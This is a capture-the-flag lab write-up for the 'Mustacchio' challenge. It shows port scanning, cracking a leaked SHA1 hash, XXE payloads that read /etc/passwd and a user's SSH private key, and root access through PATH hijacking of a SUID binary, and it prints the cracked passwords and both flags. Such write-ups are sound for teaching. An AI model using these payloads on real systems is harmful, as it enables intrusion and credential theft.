# Mustacchio CTF Writeup

**Target IP:** 10.49.172.82
**Difficulty:** Medium
**Goal:** Obtain user and root flags.

---

## 1. Enumeration

### Port Scanning
An initial Nmap scan was performed to identify open ports and services:
```bash
nmap -sC -sV 10.49.172.82
```
**Results:**
- **Port 22 (SSH):** OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
- **Port 80 (HTTP):** Apache httpd 2.4.18

### Web Enumeration (Port 80)
Browsing to `http://10.49.172.82/` revealed a website titled "Mustacchio". A directory brute-force attack was launched using `gobuster`:
```bash
gobuster dir -u http://10.49.172.82/ -w /usr/share/wordlists/dirb/common.txt
```
This discovered a `/custom/` directory. Further exploration of `/custom/js/` revealed a backup file: `users.bak`.

### Credential Extraction
The `users.bak` file was identified as an SQLite 3 database:
```bash
strings users.bak
```
**Findings:**
- Table: `users`
- Entry: `admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

The SHA1 hash was cracked using `john` and the `rockyou.txt` wordlist:
```bash
echo "admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" > hash.txt
john --format=Raw-SHA1 --wordlist=rockyou.txt hash.txt
```
If the hash was previously cracked, you can view the result with:
```bash
john --show --format=Raw-SHA1 hash.txt
```
- **Username:** `admin`
- **Password:** `bulldog19`


---

## 2. Exploitation

### Admin Panel (Port 8765)
A full port scan revealed another HTTP service on port **8765**. This port hosted an "ADMIN PANEL" login page.
Using the cracked credentials (`admin:bulldog19`), access was gained to `http://10.49.172.82:8765/home.php`.

### XML External Entity (XXE)
The admin panel featured a comment previewer that accepted XML input. Testing for XXE by attempting to read `/etc/passwd`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```
The server responded with the contents of `/etc/passwd`, confirming the vulnerability. Two local users were identified: `joe` and `barry`.

### SSH Key Extraction
The XXE vulnerability was used to check for SSH private keys. After identifying the user `barry` in `/etc/passwd`, I attempted to read his private key from `/home/barry/.ssh/id_rsa` using the following payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```

The key was successfully retrieved, but it was encrypted. I used `ssh2john` to prepare it for cracking:
```bash
ssh2john barry_id_rsa > barry_hash.txt
john --wordlist=rockyou.txt barry_hash.txt
```
- **Passphrase:** `urieljames`

### Initial Access
Using the SSH key and passphrase, a session was established as `barry`:
```bash
ssh -i barry_id_rsa barry@10.49.172.82
```
**User Flag:** `62d77a4d5f97d47c5aa38b3b2651b831`

---

## 3. Privilege Escalation

### SUID Discovery
Searching for SUID binaries on the system:
```bash
find / -perm -u=s -type f 2>/dev/null
```
An unusual binary was found at `/home/joe/live_log`.

### Binary Analysis
Running `strings` on `/home/joe/live_log` revealed that it calls the `tail` command without an absolute path:
```text
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

### PATH Hijacking
Since the binary calls `tail` relatively, the `PATH` environment variable can be hijacked.
1. Create a malicious `tail` script in `/tmp`:
   ```bash
   echo '/bin/cat /root/root.txt' > /tmp/tail
   chmod +x /tmp/tail
   ```
2. Modify the `PATH` and run the SUID binary:
   ```bash
   export PATH=/tmp:$PATH
   /home/joe/live_log
   ```
The binary executed the custom `tail` script as root, displaying the flag.

**Root Flag:** `3223581420d906c4dd1a5f9b530393a5`
